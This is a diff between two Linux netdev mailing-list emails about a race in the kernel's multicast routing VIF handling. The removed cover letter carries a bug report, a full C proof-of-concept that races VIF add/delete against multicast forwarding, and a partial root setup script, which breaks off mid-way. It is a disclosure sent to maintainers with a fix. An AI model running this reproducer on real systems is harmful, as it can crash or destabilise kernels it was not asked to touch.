@@ -1,81 +1,82 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=74.125.82.179
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=74.125.82.177
 ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1792478627;
-	b=GiJatnq3qlAFLxIyHnAA6bBQ5xG4uG7OMZh8Qk5TrVqDJAR8kfT623XCn5sf2YT93IFa
-	 VkawEBNBsmU4SvUAAJLo58SYKTzlN5i91ovGLb1z5WjJdnEv9T1Ntw0tEmu744H7uf5VZ
-	 amsh4ZtcqCVNOVwZ8ApAnu6KVuBHXFxUWj/nRxu7hiPgopS+q9Fep8WHQEXN5rs08gvjL
-	 FWbRwKlSVglaaH01Cgc65X3RonN5nwb27JkxESTX+Hx6rVSLJyaNp/j8n07SEfFpqZr81
-	 8lXj+8QBPZa615EXtmyw5ysDP6566B87JUV3PQTiqbS2ZZbMhYIfuAp2vJZQdmhg0Gg==
+	t=1792478629;
+	b=aWwbaCWag1UVtD0FNG6l1sW959TXTlHfrvA9DcwvByBen7uJlI82CtYGGXiUc6y1sfWM
+	 u+yjuqwX+qNqJfkB1RGZio/867ai/2Cp8tCJk8B6nCb0PHGjxxfPHmDi8NYh7/2sbUZDE
+	 OuAjmkQV6OlNpQnxitoBhLRiwPP99ydiuanP7v83KaDWZyRGZEJqbgdg6nVorZLrrgPYl
+	 yZTn3/0o8Gz+8kXMxIA3dmrYGkPWK2h8fKQIsUXs87m4SqttUCWEVgpuQ0T6kkrYxO/d6
+	 A6aM+4XBavhOu6IqBsQIqK+Esr1ft9XknfYgtLgi0zfVW3Y5BTg8yPR/BptLTFmuPUA==
 ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1792478627;
+	a=rsa-sha256; c=relaxed/relaxed; t=1792478629;
 	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
 	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
-	 From:To:Cc:Subject:Date:Message-ID:X-Mailer:MIME-Version:
-	 Content-Transfer-Encoding;
-	bh=DTitctE7qi4s01Ox7hpBD+uzSivhLiWLDrse+1pXAgs=;
-	b=lnhthGoYv88JZA36Qdel0kTs2/lWpTc5HpX5y0u2jSVzD6N6pCFqCBSZDJv4b4Aa7fBW
-	 Zhu+Hbpqmz3sC12h3IhSA0EjJLSxqbmgUdNsX08KKNnVAcTbbZgZAUwvrJ4EI6H78x6y+
-	 3T0vNz7Sy2LcSCXjo4DWVWE3JeekgjWN3wIVhoDr1BkwgDBECEbl0p1ZCWPpOvW5XHc1e
-	 pao0gxOVjz4Vpky1zpGPEKhp3ael3CaPKB0LvglqCzz7pk3UJP8wOmBmaioKwIAuXNmN5
-	 teOQnv/MLFqbX210vwflGCzwHFjKYs9tzXsO59a5QxUWW+WB4h30bJcT00RmKnkcUkA==
+	 From:To:Cc:Subject:Date:Message-ID:X-Mailer:In-Reply-To:References:
+	 MIME-Version:Content-Transfer-Encoding;
+	bh=0xYz+Ag6ETolcHWRJ2JKQnLDMlAkiPQPGE34hRBKeWw=;
+	b=g9hSP7zk0XYEpk8bmhFQwMADeH47QIWUKNkrul5SOcBns8vqfGtuIUSWy28yrKzfk648
+	 tR6vnogFoQjlo+KkxiddprM7HLooV2UUJU8ggRF4jWoVntyZkZg4hgKDl+aGsONlMGE8g
+	 ry2eswhvPJdy5I7seuEEBYX5zozS3phlPcYM01kPpp+x1SEs2hU0UnvulfgyHcL0+YshV
+	 xpL61QKyizlw3z5JfDXqJ0iCDjq4upoIyYTMr7oN/Ijw3mnqpu1zIl61U9Wf4wo/HvZyJ
+	 IwjRbnb+ss07mc2YoB1qevGKgYydxMTfWrXK9XFI7YBnqqQzqmCT6kRfClUJjBsZRuw==
 ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
 	dmarc=pass header.from=nebusec.ai;
 	spf=pass smtp.mailfrom=nebusec.ai;
-	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=hvfxsfgk;
-	arc=none smtp.remote-ip=74.125.82.179
-Received: from mail-dy1-f179.google.com (mail-dy1-f179.google.com [74.125.82.179])
+	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=n55TSVmJ;
+	arc=none smtp.remote-ip=74.125.82.177
+Received: from mail-dy1-f177.google.com (mail-dy1-f177.google.com [74.125.82.177])
 	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
 	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 06903606A319
-	for <netdev@vger.kernel.org>; Tue, 20 Oct 2026 06:43:46 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 06903606A319
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 16E9E606A327
+	for <netdev@vger.kernel.org>; Tue, 20 Oct 2026 06:43:48 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 16E9E606A327
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=hvfxsfgk
-Received: by mail-dy1-f179.google.com with SMTP id 5a478bee46e88-33fb4680717so5258351eec.1
-        for <netdev@vger.kernel.org>; Mon, 19 Oct 2026 23:43:46 -0700 (PDT)
+	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=n55TSVmJ
+Received: by mail-dy1-f177.google.com with SMTP id 5a478bee46e88-354ba08cfd1so5252595eec.1
+        for <netdev@vger.kernel.org>; Mon, 19 Oct 2026 23:43:48 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=nebusec.ai; s=google; t=1792478626; x=1793083426; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=DTitctE7qi4s01Ox7hpBD+uzSivhLiWLDrse+1pXAgs=;
-        b=hvfxsfgkZCIqMgrdvjb1BSTRyRSjj/J0cuv73HrvwtXC3+FsXsdlmCTv3LazbAFZo+
-         +sxKOu+6JMMAw9liOn/nnYLlMMFqvMOuNJcEg+xL0D8sToU86SmhwgLhm6y/Md/IhfeJ
-         92bx7ZkjAxODApUj0Tt0nq/EwCwQGnoY6YLA2AUjmBVHgiOU3MacQbGaBPLh3N/ZgEUv
-         OTMqCx+CjnW8zQWhOvRKeD0fL3uP2wHJOrI+UJmUKSpDSfOaFPfBqZ0lJpst7NoN+Sir
-         romhFrOfh64JQGE62uSMmc+bVQHQiCkhh7eMncsm4jhWuImQvVM3gY0PVWJma9E08InU
-         pWKw==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1792478626; x=1793083426;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+        d=nebusec.ai; s=google; t=1792478628; x=1793083428; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
          :message-id:reply-to:content-type;
-        bh=DTitctE7qi4s01Ox7hpBD+uzSivhLiWLDrse+1pXAgs=;
-        b=mb5iFzBTeJNXDzy76atmCkGWZ7L7Cia4vPR2IAFUcdtLrstGpZSPQwFFve4GQvE3iK
-         iQBk8OraBy/urP7z2Wy/v7TAfCgotitjrKyAjW3/UaPMVMg1WBoHtbZw7PAxHKCQxgEY
-         1CUBo+1n7qfIpTN+NcIcz66fbDofYmIR/eIbr45n8ebOwvqw3kE0C7KqsdyROWqEYdEw
-         hfT66wxI55meG/iqYrYNs0kRnN/grq3Uyy+0qNAqkcs/ToAW8NKqd85MwEZaeLkGjCZA
-         hTycR1q6oxwzxPY9ElpgkMjxe5IYa2EqEokXMN9zBwgb6Iat9hjHZsvoDvHokVu9r39z
-         bRKw==
-X-Forwarded-Encrypted: i=1; AKwUvByYDeZ5fl2TOzNr+ztb2q4yhosf1VaT5Wk5g3WQRRu7Nn/s7eBdAswDSh0MisLbmWB5hKvSZsg=@vger.kernel.org
-X-Gm-Message-State: AFq9FYJ+DHks8TZGPfMiXmWRiAs+w9+8/qC38s0FzPau4eFMXludRwTu
-	+aCyHdu1LFz7pt2uTD1FIzNbff3XMMFPqJz0mCli/FsRFJE9vGz3ZLiS/8ivdIO5kIWg
-X-Gm-Gg: AYBFou0Q+pP2y9C1ibNV2jEtRBhMlB18c0PHrNNRXZ3damN3LvNR8KY8cg7iO7UDyTw
-	8vvlTOrFKMr7g2ZWu5sLKyAiPWPTAp7dZ4IZOOzWiWa1Qb63QEQLzBNW4ZjWZQa6pU8FFMVlTQk
-	PZtJOpLN1FZS3Tbo7P3uYXuzmoULWZdpl+btsSllbFscYlOi5EziJu06BhMKTSZeSqKe/MRLbJ4
-	s59szjMjanSrNsytUMjuVFE0Mw5eG8Brh5S+0fDk1NakwrIhEo9ntBXG/PXU7UlbDLCYlhmBtJf
-	fNICqAqvlKWWu19gJ1Q8ewIeIAayMvj0l+rVasNWdpyrX+ojLA7P4VCS+zQ5eURebVMeRcJy9+1
-	xMAS/zQZO8lvEZL05SNKSOEfUKPz2PwVmQ1LM/EGfrXlxlkQB/ewtUKYflQXy3wyRbP8Y2OWOUw
-	eD23ESbWrWXAVTQfFfTWa4PevMvAGMReksf5FHuvfh2l6A+bRgglq8JXh4K7/pCeQ9RfKuoJpVt
-	557Y8SOZYvijvnuTvSiXgxi8rENsOSxu65EWpyWGAf+2EdWwI84fDHSQ3XQl3hkJI4+BlE=
-X-Received: by 2002:a05:693c:6395:10b0:35d:5a2c:2321 with SMTP id 5a478bee46e88-361a2348e09mr14567818eec.20.1792478625270;
-        Mon, 19 Oct 2026 23:43:45 -0700 (PDT)
+        bh=0xYz+Ag6ETolcHWRJ2JKQnLDMlAkiPQPGE34hRBKeWw=;
+        b=n55TSVmJwKVVZsGG5q397Aj4pnL0dAT3T156zuvMa/POxNLLXkAOyXXxsDbioENuVm
+         JQp40uMqOUM1hEDshSP7y1wpkMrGaG9UzHRgfbNqI1SLSusAvjcCajQJ1RMop2jf04W8
+         RMerrbnBwNDGB3FC5h7uMcY9bsFRGcn1uL8pxiqc4BFL8+oFbf2vbPEIPAy/RNCwbbbR
+         UAMlutfotwYc31z4ONsreie7sXz1qvAs69C4XjBw3rwnz/0fCZigofliOuPxNOPyV+Y2
+         D0xEpL9qaExVbu1FNFT7gBYaFhF8g7vuMD8lODbezbvylc67UgABoPEAjiemIwTlGbne
+         7qvg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20260707; t=1792478628; x=1793083428;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to:content-type;
+        bh=0xYz+Ag6ETolcHWRJ2JKQnLDMlAkiPQPGE34hRBKeWw=;
+        b=s3eJo2+Iy0XWpKxw7moDQS50igL+OeOYdq8D6KHxUdvyFjIXQ4KKofi+z/vZ4VM78R
+         OlvkZOuOE2JhvyxFwr/uWFpDJRxwQCHO3OgjM/51jHx0RTtdzvH4pt6eHYk3JeToxN+G
+         h4VirlnB7TuFVBhdEpIMYClKU4onBEeKfhHU1EEOcp/6FB4S4/fCjriYbEg+k/pn4Cl+
+         4gycMgrKjJ/wCbRvz5oGzwSLJjFYSxP8IIkUuqlQ5dgI1q4rH4DfqlP+L1ECk0P0+FSF
+         O9dylAdWj6eoPIgcOhhVBDllcSiE0lhOg0PL7tzn0rolscOJIvq5acAcgT7yW5GV8UOW
+         DlPg==
+X-Forwarded-Encrypted: i=1; AKwUvBwLxVSpJlHvc1j6TuB4Hbk5YETYLwhJpbf1G0hfEONZpIiNDBUL/f4wqwyUQtcX9xIYNqD+LNc=@vger.kernel.org
+X-Gm-Message-State: AFq9FYKoX/ji6Mwzz9THxcVFcj/raPc1NGObRLe/L+L67N4Xnb4BlpAT
+	mc5ccVsHETcW0NlCpOdPgWbNGtzY51esa40GYb//GCMQA0AsDhK+q4lqj5ZXqeAr2q/b
+X-Gm-Gg: AYBFou29P+9qRrG7Vc6s2BVdMQoOus/jnpJ1vj+lZ2HRwaQ+uRCRxYC/UnBACQEPvgE
+	vUcFxhWrTl0fDVU6z0AvGbAKzn1NsMPystOpIIPiT/n+EetDs+tmN3JmTJxBirEl5UOiGo2PLbC
+	828ZUHOyRs/KA1fngF/ME1LBUXGEDswO5TcfRhYhmPz8HtynxYbbK06SOHr+TiPXoKL8vCaapYL
+	GM/rdDoYhz+53g57tuY0eAdmmH2MAeMKb7Pk1SO8/Pn+07nGUPxRdUoAkOmlGIYMf2fMzUcpoys
+	2oCDJ/MsuerQGEQhfbry1haQPI4TBdgq1pEO3lO+RVsL7AQCpcbMFs16GlGxokq4lOv0g0UTApK
+	LkeYTfi9gInMychT+czFAfsLQhdj+aj6ZcKPy2DmlaubwYZ3mkMxy2N90M6/koNXhrc6zwuP02i
+	p1puc0Bq7gSsicE1HOVbs8HMjoQCx9AP0Mr115EG6SDWSbhGRjlq1k0Evg/UumZksNtYMqJNONl
+	WebPX89ydyn3w==
+X-Received: by 2002:a05:7301:2a95:b0:366:4514:955b with SMTP id 5a478bee46e88-36645149899mr1091439eec.20.1792478628090;
+        Mon, 19 Oct 2026 23:43:48 -0700 (PDT)
 Received: from Roxy.sysu.edu.cn ([203.175.14.54])
-        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-366639806a5sm1885010eec.6.2026.10.19.23.43.42
+        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-366639806a5sm1885010eec.6.2026.10.19.23.43.45
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Mon, 19 Oct 2026 23:43:44 -0700 (PDT)
+        Mon, 19 Oct 2026 23:43:47 -0700 (PDT)
 From: Zhiling Zou <zhilinz@nebusec.ai>
 To: idosch@nvidia.com,
 	namangulati@google.com,
@@ -87,10 +88,12 @@ Cc: dsahern@kernel.org,
 	horms@kernel.org,
 	vega@nebusec.ai,
 	zhilinz@nebusec.ai
-Subject: [PATCH net v2 0/1] ipmr: validate VIF indexes before offload lookup
-Date: Tue, 20 Oct 2026 14:43:33 +0800
-Message-ID: <cover.1792476942.git.zhilinz@nebusec.ai>
+Subject: [PATCH net v2 1/1] ipmr: validate VIF indexes before offload lookup
+Date: Tue, 20 Oct 2026 14:43:34 +0800
+Message-ID: <23ce70e99d6c710bdc4cf065d70350b754ed8f66.1792476942.git.zhilinz@nebusec.ai>
 X-Mailer: git-send-email 2.55.0
+In-Reply-To: <cover.1792476942.git.zhilinz@nebusec.ai>
+References: <cover.1792476942.git.zhilinz@nebusec.ai>
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Post: <mailto:netdev@vger.kernel.org>
@@ -102,536 +105,93 @@ Precedence: list
 MIME-Version: 1.0
 Content-Transfer-Encoding: 8bit
 
-Hi Linux kernel maintainers,
-
-We found and validated a race in net/ipv4/ipmr.c and net/ipv6/ip6mr.c.
-It is reachable by a root user configuring IPv4 multicast routing and
-racing VIF updates with packet forwarding.
-
-We will provide details of the bug below, along with the PoC and crash
-log from the original report.
-
----- details below ----
-
-Bug details:
-
-During vif_add(), the VIF device pointer is published before mrt->maxvif
-is increased. A concurrent packet can therefore make ipmr_find_vif()
-return -1 after observing the old maxvif, even though the MFC parent
-VIF's published device matches the ingress device.
-
-In IPv4 forwarding, this race can pass the parent-device check with an
-invalid ingress VIF. For (*,G) entries, that can also allow the packet
-to be forwarded back out its ingress VIF. If the skb is marked for L3
-forwarding offload, ipmr_forward_offloaded() can form a pointer using
-in_vifi == -1 and read outside vif_table. Such a read requires the skb
-to carry the offload mark, which is set by mlxsw; the race is rare. The
-PoC only reproduces a UBSAN report for the negative array index, not an
-actual out-of-bounds read. IPv6 has the same VIF lookup race and can
-also incorrectly forward the packet.
-
-The fix drops packets when the ingress VIF lookup fails in both IPv4
-and IPv6 forwarding, before accessing the MFC parent VIF. The IPv4
-offload helper also checks only for a negative in_vifi before forming
-vif_table pointers; out_vifi is bounded by the MFC output-interface
-iteration.
-
-Reproducer:
-
-    sh ./poc.sh 120
-
-The PoC was run as root in a 2 vCPU, 2 GB x86 QEMU guest using the
-provided Linux 6.12.95 build and configuration.
-
-------BEGIN poc.c------
-
-    #define _GNU_SOURCE
-
-    #include <arpa/inet.h>
-    #include <errno.h>
-    #include <linux/mroute.h>
-    #include <net/if.h>
-    #include <pthread.h>
-    #include <sched.h>
-    #include <signal.h>
-    #include <stdbool.h>
-    #include <stdint.h>
-    #include <stdio.h>
-    #include <stdlib.h>
-    #include <string.h>
-    #include <sys/ioctl.h>
-    #include <sys/socket.h>
-    #include <sys/sysinfo.h>
-    #include <sys/types.h>
-    #include <time.h>
-    #include <unistd.h>
-
-    #define GROUP_ADDR "239.1.1.1"
-    #define SRC_ADDR "10.0.0.2"
-
-    #define IN_DEV "vifin"
-    #define OUT_DEV "vifout"
-    #define SRC_DEV "src0"
-
-    #define IN_VIFI 31
-    #define OUT_VIFI 30
-    #define UDP_PORT 5000
-    #define BATCH 64
-
-    static volatile sig_atomic_t stop_flag;
-    static int mroute_fd = -1;
-    static int src_ifindex;
-    static int in_ifindex;
-    static int out_ifindex;
-
-    static volatile unsigned long long adds_done;
-    static volatile unsigned long long dels_done;
-    static void on_signal(int sig)
-    {
-    	(void)sig;
-    	stop_flag = 1;
-    }
-
-    static void bind_to_cpu(int cpu)
-    {
-    	cpu_set_t set;
-    	int ncpu = get_nprocs();
-
-    	if (ncpu <= 0)
-    		return;
-
-    	CPU_ZERO(&set);
-    	CPU_SET(cpu % ncpu, &set);
-    	pthread_setaffinity_np(pthread_self(), sizeof(set), &set);
-    }
-
-    static void fatal(const char *what)
-    {
-    	fprintf(stderr, "fatal: %s: %s\n", what, strerror(errno));
-    	exit(EXIT_FAILURE);
-    }
-
-    static int vif_op(int optname, vifi_t vifi, int ifindex)
-    {
-    	struct vifctl vif = {
-    		.vifc_vifi = vifi,
-    		.vifc_flags = VIFF_USE_IFINDEX,
-    		.vifc_threshold = 1,
-    		.vifc_rate_limit = 0,
-    		.vifc_lcl_ifindex = ifindex,
-    	};
-
-    	return setsockopt(mroute_fd, IPPROTO_IP, optname, &vif, sizeof(vif));
-    }
-
-    static void add_vif_checked(vifi_t vifi, int ifindex)
-    {
-    	if (vif_op(MRT_ADD_VIF, vifi, ifindex) < 0)
-    		fatal("MRT_ADD_VIF");
-    }
-
-    static void del_vif_best_effort(vifi_t vifi, int ifindex)
-    {
-    	if (vif_op(MRT_DEL_VIF, vifi, ifindex) < 0 &&
-    	    errno != EADDRNOTAVAIL)
-    		fatal("MRT_DEL_VIF");
-    }
-
-    static void add_mfc_checked(void)
-    {
-    	struct mfcctl mfc;
-
-    	memset(&mfc, 0, sizeof(mfc));
-    	if (!inet_aton(SRC_ADDR, &mfc.mfcc_origin))
-    		exit(EXIT_FAILURE);
-    	if (!inet_aton(GROUP_ADDR, &mfc.mfcc_mcastgrp))
-    		exit(EXIT_FAILURE);
-
-    	mfc.mfcc_parent = IN_VIFI;
-    	memset(mfc.mfcc_ttls, 255, sizeof(mfc.mfcc_ttls));
-    	mfc.mfcc_ttls[OUT_VIFI] = 1;
-
-    	if (setsockopt(mroute_fd, IPPROTO_IP, MRT_ADD_MFC, &mfc, sizeof(mfc)) < 0)
-    		fatal("MRT_ADD_MFC");
-    }
-
-    static void flush_tables(void)
-    {
-    	int flags = MRT_FLUSH_MFC | MRT_FLUSH_MFC_STATIC |
-    		    MRT_FLUSH_VIFS | MRT_FLUSH_VIFS_STATIC;
-
-    	if (mroute_fd >= 0)
-    		setsockopt(mroute_fd, IPPROTO_IP, MRT_FLUSH, &flags, sizeof(flags));
-    }
-
-    static int get_mfc_pktcnt(unsigned long *pktcnt)
-    {
-    	struct sioc_sg_req req;
-
-    	memset(&req, 0, sizeof(req));
-    	if (!inet_aton(SRC_ADDR, &req.src))
-    		return -1;
-    	if (!inet_aton(GROUP_ADDR, &req.grp))
-    		return -1;
-    	if (ioctl(mroute_fd, SIOCGETSGCNT, &req) < 0)
-    		return -1;
-
-    	*pktcnt = req.pktcnt;
-    	return 0;
-    }
-
-    static void selftest_forwarding(void)
-    {
-    	unsigned long before = 0;
-    	unsigned long after = 0;
-    	int tries;
-
-    	fprintf(stderr, "[*] self-test: add input VIF and verify multicast forwarding\n");
-    	add_vif_checked(IN_VIFI, in_ifindex);
-    	if (get_mfc_pktcnt(&before) < 0)
-    		fatal("SIOCGETSGCNT(before)");
-
-    	for (tries = 0; tries < 30; tries++) {
-    		usleep(100000);
-    		if (get_mfc_pktcnt(&after) < 0)
-    			fatal("SIOCGETSGCNT(after)");
-    		if (after > before)
-    			break;
-    	}
-    	if (after <= before) {
-    		fprintf(stderr, "fatal: self-test did not advance MFC packet counters\n");
-    		exit(EXIT_FAILURE);
-    	}
-
-    	fprintf(stderr, "[+] self-test passed: MFC packets %lu -> %lu\n", before, after);
-    	del_vif_best_effort(IN_VIFI, in_ifindex);
-    }
-
-    static int make_sender_socket(void)
-    {
-    	int fd;
-    	struct sockaddr_in bind_addr = {
-    		.sin_family = AF_INET,
-    		.sin_port = htons(0),
-    	};
-    	struct ip_mreqn ifreq = { .imr_ifindex = src_ifindex };
-    	unsigned char ttl = 64;
-
-    	fd = socket(AF_INET, SOCK_DGRAM, 0);
-    	if (fd < 0)
-    		fatal("socket(sender)");
-
-    	if (!inet_aton(SRC_ADDR, &bind_addr.sin_addr))
-    		exit(EXIT_FAILURE);
-
-    	if (setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, SRC_DEV, sizeof(SRC_DEV)) < 0)
-    		fatal("SO_BINDTODEVICE(sender)");
-    	if (setsockopt(fd, IPPROTO_IP, IP_MULTICAST_IF, &ifreq, sizeof(ifreq)) < 0)
-    		fatal("IP_MULTICAST_IF(sender)");
-    	if (setsockopt(fd, IPPROTO_IP, IP_MULTICAST_TTL, &ttl, sizeof(ttl)) < 0)
-    		fatal("IP_MULTICAST_TTL(sender)");
-    	if (bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0)
-    		fatal("bind(sender)");
-
-    	return fd;
-    }
-
-    static int sender_main(int seconds)
-    {
-    	int fd = make_sender_socket();
-    	struct sockaddr_in dst = {
-    		.sin_family = AF_INET,
-    		.sin_port = htons(UDP_PORT),
-    	};
-    	struct iovec iov[BATCH];
-    	struct mmsghdr msgs[BATCH];
-    	char payload[128];
-    	int i;
-
-    	signal(SIGINT, on_signal);
-    	signal(SIGTERM, on_signal);
-    	signal(SIGALRM, on_signal);
-    	alarm(seconds);
-
-    	if (!inet_aton(GROUP_ADDR, &dst.sin_addr))
-    		exit(EXIT_FAILURE);
-
-    	memset(payload, 0x42, sizeof(payload));
-    	memset(msgs, 0, sizeof(msgs));
-    	for (i = 0; i < BATCH; i++) {
-    		iov[i].iov_base = payload;
-    		iov[i].iov_len = sizeof(payload);
-    		msgs[i].msg_hdr.msg_name = &dst;
-    		msgs[i].msg_hdr.msg_namelen = sizeof(dst);
-    		msgs[i].msg_hdr.msg_iov = &iov[i];
-    		msgs[i].msg_hdr.msg_iovlen = 1;
-    	}
-
-    	while (!stop_flag) {
-    		int ret = sendmmsg(fd, msgs, BATCH, 0);
-
-    		if (ret > 0)
-    			continue;
-    		if (ret < 0 && (errno == EINTR || errno == ENOBUFS))
-    			continue;
-    		fatal("sendmmsg(sender)");
-    	}
-
-    	close(fd);
-    	return EXIT_SUCCESS;
-    }
-
-    static void *toggle_thread(void *arg)
-    {
-    	int cpu = (int)(intptr_t)arg;
-
-    	bind_to_cpu(cpu);
-    	while (!stop_flag) {
-    		if (vif_op(MRT_ADD_VIF, IN_VIFI, in_ifindex) == 0) {
-    			__sync_fetch_and_add(&adds_done, 1);
-    		} else if (errno != EADDRINUSE) {
-    			fatal("MRT_ADD_VIF(loop)");
-    		}
-
-    		if (vif_op(MRT_DEL_VIF, IN_VIFI, in_ifindex) == 0) {
-    			__sync_fetch_and_add(&dels_done, 1);
-    		} else if (errno != EADDRNOTAVAIL) {
-    			fatal("MRT_DEL_VIF(loop)");
-    		}
-    	}
-
-    	return NULL;
-    }
-
-    static int race_main(int seconds)
-    {
-    	int mrt_init = 1;
-    	pthread_t toggler;
-    	time_t start;
-
-    	signal(SIGINT, on_signal);
-    	signal(SIGTERM, on_signal);
-    	signal(SIGALRM, on_signal);
-
-    	in_ifindex = if_nametoindex(IN_DEV);
-    	out_ifindex = if_nametoindex(OUT_DEV);
-    	if (!in_ifindex || !out_ifindex) {
-    		fprintf(stderr, "fatal: missing expected interfaces (%s, %s)\n",
-    			IN_DEV, OUT_DEV);
-    		return EXIT_FAILURE;
-    	}
-
-    	mroute_fd = socket(AF_INET, SOCK_RAW, IPPROTO_IGMP);
-    	if (mroute_fd < 0)
-    		fatal("socket(AF_INET, SOCK_RAW, IPPROTO_IGMP)");
-    	if (setsockopt(mroute_fd, IPPROTO_IP, MRT_INIT, &mrt_init, sizeof(mrt_init)) < 0)
-    		fatal("MRT_INIT");
-
-    	flush_tables();
-    	add_vif_checked(OUT_VIFI, out_ifindex);
-    	add_mfc_checked();
-    	selftest_forwarding();
-
-    	fprintf(stderr, "[*] racing VIF publication against multicast ingress for up to %d seconds\n",
-    		seconds);
-    	alarm(seconds);
-    	start = time(NULL);
-
-    	if (pthread_create(&toggler, NULL, toggle_thread, (void *)(intptr_t)0) != 0)
-    		fatal("pthread_create(toggler)");
-
-    	while (!stop_flag) {
-    		unsigned long pktcnt = 0;
-
-    		sleep(1);
-    		if (get_mfc_pktcnt(&pktcnt) < 0)
-    			pktcnt = 0;
-    		fprintf(stderr,
-    			"[*] %lds mfc_pktcnt=%lu add=%llu del=%llu\n",
-    			(long)(time(NULL) - start),
-    			pktcnt, adds_done, dels_done);
-    	}
-
-    	fprintf(stderr, "[*] stopping without observed crash\n");
-    	pthread_join(toggler, NULL);
-
-    	flush_tables();
-    	setsockopt(mroute_fd, IPPROTO_IP, MRT_DONE, &mrt_init, sizeof(mrt_init));
-    	close(mroute_fd);
-    	return EXIT_SUCCESS;
-    }
-
-    int main(int argc, char **argv)
-    {
-    	int seconds = 300;
-
-    	if (argc > 2)
-    		seconds = atoi(argv[2]);
-    	else if (argc > 1 && strcmp(argv[1], "sender") != 0)
-    		seconds = atoi(argv[1]);
-    	if (seconds <= 0)
-    		seconds = 300;
-
-    	src_ifindex = if_nametoindex(SRC_DEV);
-    	in_ifindex = if_nametoindex(IN_DEV);
-    	out_ifindex = if_nametoindex(OUT_DEV);
-
-    	if (argc > 1 && strcmp(argv[1], "sender") == 0) {
-    		src_ifindex = if_nametoindex(SRC_DEV);
-    		if (!src_ifindex) {
-    			fprintf(stderr, "fatal: missing sender interface %s\n", SRC_DEV);
-    			return EXIT_FAILURE;
-    		}
-    		return sender_main(seconds);
-    	}
-
-    	if (!in_ifindex || !out_ifindex) {
-    		fprintf(stderr, "fatal: missing expected interfaces (%s, %s)\n",
-    			IN_DEV, OUT_DEV);
-    		return EXIT_FAILURE;
-    	}
-
-    	return race_main(seconds);
-    }
-
-------END poc.c--------
-
-------BEGIN poc.sh------
-
-    #!/bin/sh
-    set -eu
-
-    cd "$(dirname "$0")"
-
-    cleanup() {
-    	if [ -e /sys/kernel/debug/tracing/events/kprobes/enable ]; then
-    		echo 0 >/sys/kernel/debug/tracing/events/kprobes/enable
-    	fi
-    	if [ -e /sys/kernel/debug/tracing/kprobe_events ]; then
-    		echo '-:ipmr_hold' >/sys/kernel/debug/tracing/kprobe_events 2>/dev/null || true
-    		echo '-:ipmr_find_hold' >/sys/kernel/debug/tracing/kprobe_events 2>/dev/null || true
-    	fi
-    	ip netns del ns_src 2>/dev/null || true
-    	ip link del vifin 2>/dev/null || true
-    	ip link del vifout 2>/dev/null || true
-    }
-
-    trap cleanup EXIT
-    cleanup
-
-    ip link add vifin type veth peer name src0
-    ip link add vifout type veth peer name sink0
-
-    ip netns add ns_src
-    ip link set src0 netns ns_src
-
-    ip addr add 10.0.0.1/24 dev vifin
-    ip addr add 10.0.1.1/24 dev vifout
-    ip addr add 10.0.1.2/24 dev sink0
-
-    ip link set vifin up
-    ip link set vifout up
-    ip link set sink0 up
-
-    ip -n ns_src addr add 10.0.0.2/24 dev src0
-    ip -n ns_src link set lo up
-    ip -n ns_src link set src0 up
-
-    sysctl -q -w net.ipv4.ip_forward=1
-    sysctl -q -w net.ipv4.conf.all.rp_filter=0
-    sysctl -q -w net.ipv4.conf.default.rp_filter=0
-    sysctl -q -w net.ipv4.conf.vifin.rp_filter=0
-    sysctl -q -w net.ipv4.conf.vifout.rp_filter=0
-    sysctl -q -w net.ipv4.conf.sink0.rp_filter=0
-
-    mount -t debugfs none /sys/kernel/debug 2>/dev/null || true
-    echo '-:ipmr_hold' >/sys/kernel/debug/tracing/kprobe_events 2>/dev/null || true
